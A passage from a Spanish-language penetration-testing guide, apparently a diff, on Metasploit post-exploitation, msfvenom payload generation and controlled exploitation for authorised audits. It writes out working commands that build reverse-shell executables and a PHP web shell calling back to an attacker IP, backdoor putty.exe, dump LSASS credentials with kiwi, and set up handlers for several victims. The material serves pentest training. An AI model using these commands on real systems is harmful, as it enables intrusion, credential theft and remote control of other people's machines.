+Mediante el comando `load kiwi`, Metasploit integra las capacidades de la herramienta Mimikatz en la sesión. Al cargarse, se habilita el comando `creds_all`, el cual examina la memoria del proceso LSASS y recupera contraseñas en texto plano almacenadas por proveedores de autenticación como WDigest (común en versiones anteriores a Windows 8.1 o Server 2012 R2).
+
+#### Módulos de Post-Explotación (`post/`)
+Son módulos independientes de Metasploit diseñados para ejecutarse sobre sesiones abiertas. El procedimiento consiste en enviar la sesión a segundo plano (`background`), cargar el módulo deseado con `use post/ruta`, asignar el parámetro `set SESSION ID_SESION` y ejecutar `run`. Ejemplos destacados incluyen `post/windows/gather/enum_domain` (enumeración de Active Directory), `post/windows/gather/enum_shares` (recursos compartidos de red) y `post/multi/manage/shell_to_meterpreter` (actualización de una shell básica a una sesión Meterpreter).
+
+---
+
+## 4. Metasploit: Generación de Payloads
+
+### 4.1 Sintaxis Básica de Msfvenom y Referencia de Banderas
+`msfvenom` es la herramienta de línea de comandos independiente del marco Metasploit utilizada para generar cargas útiles personalizadas fuera de la consola interactiva. Se emplea cuando la entrega del ataque requiere depositar un archivo ejecutable en el objetivo (por subida de archivos, phishing o USB), inyectar código en un ejecutable legítimo o generar fragmentos de código de shell (*shellcode*) para exploits personalizados.
+
+La sintaxis básica de `msfvenom` requiere definir la carga útil mediante `-p`, el formato de salida con `-f`, el archivo de destino con `-o`, y las opciones de conexión `LHOST` y `LPORT` asignadas directamente como pares `CLAVE=VALOR`:
+
+```bash
+msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=4444 -f exe -o payload.exe
+```
+
+| Bandera | Propósito Técnico | Ejemplo de Uso |
+| :--- | :--- | :--- |
+| `-p` | Selecciona la carga útil a generar. | `-p linux/x64/meterpreter_reverse_tcp` |
+| `-f` | Define el formato de salida (ejecutable o transformación). | `-f exe` \| `-f elf` \| `-f raw` \| `-f c` |
+| `-o` | Especifica la ruta del archivo de salida. | `-o payload.bin` |
+| `-e` | Selecciona el módulo codificador a aplicar. | `-e x86/shikata_ga_nai` |
+| `-i` | Define el número de iteraciones de codificación. | `-i 5` |
+| `-b` | Lista caracteres prohibidos a eliminar (*bad chars*). | `-b ' 
+'` |
+| `-x` | Selecciona un binario legítimo como plantilla de inyección. | `-x putty.exe` |
+| `-k` | Mantiene el comportamiento original de la plantilla. | `-k` (se usa junto a `-x`) |
+| `-a` | Anula la arquitectura predeterminada. | `-a x64` \| `-a x86` |
+| `--platform` | Anula la plataforma predeterminada. | `--platform windows` \| `--platform linux` |
+| `-n` | Añade un trineo NOP de N bytes al inicio. | `-n 16` |
+| `LHOST=` | Opción de payload: IP del oyente del atacante. | `LHOST=10.10.14.2` |
+| `LPORT=` | Opción de payload: Puerto del oyente del atacante. | `LPORT=4444` |
+
+Para descubrir el catálogo de opciones disponibles en `msfvenom` se utiliza la bandera `-l` combinada con herramientas de filtrado como `grep`. Los comandos principales son `msfvenom -l payloads` (lista de cargas útiles), `msfvenom -l formats` (formatos de salida), `msfvenom -l encoders` (codificadores) y `msfvenom -p RUTA_PAYLOAD --list-options` (para consultar los parámetros requeridos por una carga útil específica).
+
+### 4.2 Payloads Escenificados (Staged) vs. Sin Etapas (Stageless)
+Al generar cargas útiles con `msfvenom` es crítico elegir adecuadamente entre variantes escenificadas y sin etapas. La diferencia en la sintaxis radica en el separador utilizado en el nombre: las cargas por etapas emplean una barra `/` (`meterpreter/reverse_tcp`), mientras que las cargas sin etapas emplean un guión bajo `_` (`meterpreter_reverse_tcp`).
+
+| Factor Operativo | Carga Útil Sin Etapas (Stageless) | Carga Útil Por Etapas (Staged) |
+| :--- | :--- | :--- |
+| **Tamaño del Archivo** | Mayor (Incluye el agente Meterpreter completo, ~245 KB EXE). | Muy pequeño (Solo contiene el stager de conexión, ~7 KB EXE). |
+| **Fiabilidad de Red** | Alta. Requiere una sola conexión exitosa. | Depende de mantener la estabilidad durante la segunda descarga. |
+| **Dependencia de Red** | Autónoma tras el inicio. | Requiere que el controlador entregue la segunda etapa (*stage*). |
+| **Superficie de Disco** | Binario completo almacenado en el archivo. | Archivo inicial minúsculo, pero la descarga del stage es visible en red. |
+| **Uso Preferente** | Archivos independientes generados con `msfvenom`. | Módulos de explotación internos dentro de `msfconsole`. |
+
+En la práctica, las cargas útiles independientes generadas con `msfvenom` para entrega manual deben ser predominantemente variantes sin etapas (`stageless`), ya que la fiabilidad de disponer de un binario autónomo prevalece sobre las restricciones de tamaño.
+
+### 4.3 Formatos de Salida y Recetas Habituales
+Los formatos de salida de `msfvenom` (bandera `-f`) se dividen en dos categorías principales:
+
+Los **Formatos Ejecutables** generan archivos binarios independientes preparados para ser ejecutados directamente por el sistema operativo objetivo. Incluyen `exe` y `msi` (Windows), `elf` (Linux), `macho` (macOS), `apk` (Android) y `war` (aplicaciones web Java).
+
+Los **Formatos de Transformación** generan cadenas de código o arreglos de datos para ser incrustados dentro de otros scripts, lenguajes de programación o exploits personalizados. Incluyen `raw` (bytes planos), `c`, `csharp`, `python`, `powershell`, `hex` y `base64`.
+
+#### Receta 1: Ejecutable para Windows (EXE sin etapas)
+```bash
+msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=4444 -f exe -o payload.exe
+```
+
+#### Receta 2: Ejecutable para Linux (ELF sin etapas)
+```bash
+msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=4444 -f elf -o payload.elf
+```
+
+#### Receta 3: Web Shell para Servidor PHP
+```bash
+msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=4444 -f raw -o shell.php
+```
+*(Nota técnica: Tras generar el archivo PHP, se debe verificar que comience con la etiqueta `<?php` limpia sin bloques de comentarios que impidan su interpretación por el servidor web).*
+
+#### Receta 4: Comando Único en Python (One-Liner sin archivo en disco)
+```bash
+msfvenom -p cmd/unix/reverse_python LHOST=10.10.14.2 LPORT=4444 -f raw
+```
+
+#### Receta 5: Shellcode C para Exploit Personalizado
+```bash
+msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=4444 -f c
+```
+
+| Escenario de Entrega | Carga Útil Recomendada | Formato (`-f`) |
+| :--- | :--- | :--- |
+| Entrega de archivo en Windows | `windows/x64/meterpreter_reverse_tcp` | `-f exe` |
+| Transferencia por SSH a Linux | `linux/x64/meterpreter_reverse_tcp` | `-f elf` |
+| Subida de archivos en aplicación PHP | `php/meterpreter_reverse_tcp` | `-f raw` |
+| Inyección de comandos en Linux | `cmd/unix/reverse_python` | `-f raw` |
+| Desbordamiento de búfer en C | Carga útil de la arquitectura en C | `-f c` |
+| Ejecución mediante PowerShell | `windows/x64/meterpreter_reverse_tcp` | `-f powershell` |
+| Despliegue en Tomcat / Jenkins | `java/meterpreter/reverse_tcp` | `-f war` |
+
+### 4.4 Codificadores (Encoders) y Mitos de Evasión
+Existe la falsa creencia entre principiantes de que codificar una carga útil con `msfvenom` (por ejemplo utilizando el codificador `x86/shikata_ga_nai`) permite eludir las soluciones antivirus. La realidad técnica es que la codificación no constituye un método de evasión de antivirus.
+
+Un codificador transforma la secuencia de bytes del payload aplicando operaciones matemáticas (como XOR polimórfico) y antepone un pequeño código decodificador (*stub*). Al ejecutarse en la víctima, el *stub* descifra la carga útil en la memoria RAM y le pasa el control. 
+
+Los propósitos reales de la codificación son técnicamente legítimos pero ajenos al sigilo: eliminar bytes prohibidos (*bad characters*) que romperían la ejecución del exploit (como bytes nulos `\x00` en funciones de cadena de C) y garantizar que los bytes generados se ajusten a las restricciones del canal (como conjuntos de caracteres ASCII).
+
+Para eliminar caracteres prohibidos se utiliza la bandera `-b` seguida de los bytes en hexadecimal:
+
+```bash
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.2 LPORT=4444 -b ' 
+' -f exe -o payload.exe
+```
+
+Las soluciones antivirus modernas no se limitan a la inspección estática de firmas en disco. Utilizan análisis heurístico de comportamiento, ejecución aislada en cajas de arena (*sandboxing*), aprendizaje automático e interfaces en tiempo de ejecución como AMSI en Windows. Estas defensas detectan de inmediato la estructura del *stub* decodificador o analizan el código una vez descifrado en memoria. La evasión real de antivirus exige el uso de cargadores personalizados (*loaders*), ofuscación avanzada e inyección directa en procesos.
+
+### 4.5 Inyección en Binarios y Payloads Multiplataforma
+`msfvenom` permite inyectar una carga útil dentro de un ejecutable legítimo existente utilizando la bandera `-x`. De este modo, el archivo final conserva la apariencia de la aplicación original.
+
+Para inyectar un payload dentro de un ejecutable como `putty.exe` intentando preservar además el funcionamiento normal de la aplicación original en segundo plano, se combina la bandera `-x` con `-k`:
+
+```bash
+msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=4444 -x putty.exe -k -f exe -o putty_backdoor.exe
+```
+
+El uso de plantillas inyectadas presenta importantes vectores de detección en entornos reales: la alteración del hash del archivo frente a valores conocidos, la anulación automática de la firma digital del software (mostrando advertencias de editor no verificado) y los patrones heurísticos de las soluciones de seguridad que analizan secciones de código modificadas.
+
+`msfvenom` admite la creación de cargas útiles para múltiples plataformas adicionales: paquetes APK para dispositivos Android, binarios Mach-O para macOS, archivos WAR para servidores de aplicaciones Java (Tomcat, JBoss), scripts ASP/ASPX para servidores Microsoft IIS y archivos JSP.
+
+### 4.6 Controladores (Handlers) y Captura de Conexiones
+Cualquier carga útil generada con `msfvenom` que utilice una conexión inversa exige disponer de un receptor a la escucha en la máquina del atacante. El oyente universal de Metasploit es el módulo `exploit/multi/handler`.
+
+Para garantizar que el controlador capture la conexión entrante se debe cumplir la **Regla de Oro de Coincidencia**: los tres parámetros asignados en el controlador (`PAYLOAD`, `LHOST` y `LPORT`) deben ser 100% idénticos a los valores utilizados al generar el archivo con `msfvenom`. Si existe la menor discrepancia (por ejemplo haber generado una carga sin etapas `meterpreter_reverse_tcp` y configurar el controlador con la versión por etapas `meterpreter/reverse_tcp`), la conexión fallará silenciosamente sin mostrar mensaje de error.
+
+#### Paso 1: Generación con msfvenom
+```bash
+msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=4444 -f exe -o update.exe
+```
+
+#### Paso 2: Configuración del Handler en msfconsole
+```text
+msf6 > use exploit/multi/handler
+msf6 exploit(multi/handler) > set PAYLOAD windows/x64/meterpreter_reverse_tcp
+msf6 exploit(multi/handler) > set LHOST 10.10.14.2
+msf6 exploit(multi/handler) > set LPORT 4444
+msf6 exploit(multi/handler) > run -j
+```
+
+Al utilizar `run -j`, el controlador se inicia en segundo plano como un trabajo (*job*), permitiendo al auditor continuar operando en la consola mientras espera la recepción de sesiones. Si se desea que el controlador permanezca a la escucha tras recibir la primera conexión para capturar múltiples víctimas simultáneas, se configura el parámetro `set ExitOnSession false`. Además, mediante `set AutoRunScript post/windows/manage/migrate` es posible automatizar la migración inmediata del Meterpreter entrante hacia un proceso estable del sistema tan pronto como se abra la sesión.
+
+---
+
+## 5. Explotación y Armamentización
+
+### 5.1 De la Detección de Vulnerabilidades a la Explotación
+La fase de explotación y armamentización representa el punto de encuentro entre la identificación técnica de fallos y la demostración de su impacto real sobre la seguridad del cliente. Antes de proceder con el lanzamiento de cualquier exploit, el auditor debe realizar un análisis metódico del hallazgo.
+
+El análisis de un hallazgo exige responder a preguntas clave: qué componente específico se encuentra afectado, cuáles son las condiciones previas obligatorias para que la falla sea ejecutable (nivel de autenticación, posición en la red, interacción del usuario) y cómo se materializaría un ataque exitoso.
+
+Es indispensable **confirmar la explotabilidad real** del fallo antes de sacar conclusiones. Un hallazgo preliminar puede ser el resultado de una coincidencia de versión en un banner o una comprobación teórica de configuración que no refleja la realidad del sistema. En auditorías de red, la verificación se realiza mediante escáneres auxiliares no destructivos (como `auxiliary/scanner/smb/smb_ms17_010`) o mediante el comando `check` del propio módulo. En aplicaciones web, la confirmación implica interactuar directamente con la funcionalidad (por ejemplo, en una sospecha de IDOR, acceder primero a datos propios para establecer la línea de base y posteriormente solicitar un registro perteneciente a otro usuario).
+
+Antes de dar por confirmada una vulnerabilidad, el problema debe **reproducirse de forma fiable** al menos dos veces bajo las mismas condiciones operativas. Si la activación es intermitente, se deben investigar las causas subyacentes (estado de la sesión, almacenamiento en caché, variables de tiempo o bloqueos por tasa de peticiones).
+
+Finalmente, el auditor debe **decidir si la explotación activa es necesaria**. Si el riesgo de un hallazgo es completamente claro y evidente sin requerir demostración (como la ausencia de un encabezado de seguridad o la exposición pública de un banner), se documenta directamente. La explotación activa se reserva exclusivamente para aquellos casos donde sea imprescindible demostrar el impacto real ante la organización.
+
+### 5.2 Técnicas de Explotación Controlada
+El objetivo de la explotación durante una prueba de penetración no es causar el máximo daño, sino demostrar la viabilidad del ataque en condiciones reales de forma segura. La explotación controlada se rige por tres principios operativos:
+
+#### Principio 1: Demostrar el Control de Forma Mínima
+Consiste en evidenciar que se puede influir en el sistema para modificar su comportamiento previsto pero sin alterar su operatividad. Para demostrar ejecución remota de comandos (RCE), basta con ejecutar órdenes de lectura no destructivas como `whoami`, `hostname` o `id`. En inyecciones SQL (SQLi), la extracción de variables del sistema como `@@version` o `SYSTEM_USER` demuestra la vulnerabilidad y los privilegios sin necesidad de volcar tablas enteras de la base de datos. En Scripts en Sitios Cruzados (XSS), la ejecución de `alert(document.domain)` o la demostración controlada de lectura de cookie evidencia el impacto.
+
+#### Principio 2: Delimitar el Radio de Impacto (*Blast Radius*)
+El auditor debe clasificar sus acciones entre no destructivas y destructivas. Las acciones reversibles y de lectura (leer un registro, verificar acceso a un panel administrativo) son de bajo riesgo y suficientes para el informe. Las acciones irreversibles o destructivas (eliminación de datos, modificación de registros de producción, caídas de servicio o creación de cuentas no autorizadas) están prohibidas salvo autorización explícita por escrito del cliente. Asimismo, se debe evitar el uso descontrolado de herramientas automatizadas (como SQLMap masivo o escaneos agresivos en paralelo) que puedan saturar la infraestructura objetivo.
+
+#### Principio 3: Documentar sobre la Marcha
+Toda evidencia debe capturarse en el instante preciso en que se confirma el éxito del ataque. Se deben guardar los pares de petición y respuesta en herramientas como Burp Suite, los registros de texto de la terminal con sus marcas de tiempo y el contexto operativo. Una evidencia de alta calidad consiste en la petición exacta que desencadenó el fallo y la respuesta que lo confirmó, lo cual supera en claridad a decenas de capturas de pantalla inconexas.
+
+### 5.3 Armamentización Consciente del Contexto
+La armamentización es la traducción del acceso técnico conseguido en un impacto empresarial comprensible para la organización. Para lograrlo se analizan los siguientes elementos:
+
+#### Límites de Confianza (*Trust Boundaries*)
+Los límites de confianza definen las barreras intencionales que separan usuarios, servicios y niveles de red. Una vulnerabilidad adquiere una severidad crítica cuando permite romper o cruzar un límite de confianza (por ejemplo, cuando un usuario convencional accede a funciones de administración o cuando un servidor web en la DMZ logra conectarse a la red interna).
+
+#### Significado Real del Acceso
+Se debe diferenciar la métrica técnica del impacto de negocio. Un fallo que permite la toma de control de cuentas en un flujo de restablecimiento de contraseña posee un impacto empresarial devastador. Por el contrario, un fallo en la configuración de un tema de interfaz posee un impacto insignificante, aunque técnicamente la vulnerabilidad pertenezca a la misma categoría de validación. De igual forma, comprometer un Controlador de Dominio implica el control total de la organización, mientras que comprometer una estación de trabajo aislada presenta un impacto acotado.
+
+#### Apalancamiento de la Funcionalidad Existente
+La armamentización más elegante y difícil de detectar es aquella que abusa de la propia lógica de negocio y funcionalidades nativas del sistema sin introducir código malicioso ajeno.
+
+| Acción de Alto Valor | Explotación y Armamentización Consciente del Contexto |
+| :--- | :--- |
+| **Restablecimiento de Contraseñas** | Explotar flujos de recuperación débiles para secuestrar cuentas legítimas y escalar acceso. |
+| **Gestión de Roles de Usuario** | Manipular asignaciones de privilegios en peticiones HTTP para obtener rol de administrador. |
+| **Funciones de Pago y Transacción** | Alterar parámetros de valor, tipos de cambio de moneda o reglas de aprobación financiera. |
+| **Recuperación de Datos** | Explotar vulnerabilidades IDOR para realizar recolección masiva de registros de clientes. |
+
+### 5.4 Encadenamiento de Vulnerabilidades (Vulnerability Chaining)
+El encadenamiento de vulnerabilidades consiste en combinar múltiples hallazgos individuales que por separado podrían parecer de bajo riesgo, con el fin de construir una ruta de ataque completa de alto impacto.
+
+Un ejemplo clásico de encadenamiento es combinar una vulnerabilidad de enumeración de nombres de usuario en el formulario de login con una debilidad en la lógica del mecanismo de recuperación de contraseñas. La primera vulnerabilidad permite obtener la lista de cuentas válidas de la empresa y la segunda permite tomar el control de dichas cuentas. Al presentar los hallazgos encadenados en el informe, el auditor demuestra el riesgo real al que se expone la organización en un escenario de ataque del mundo real.
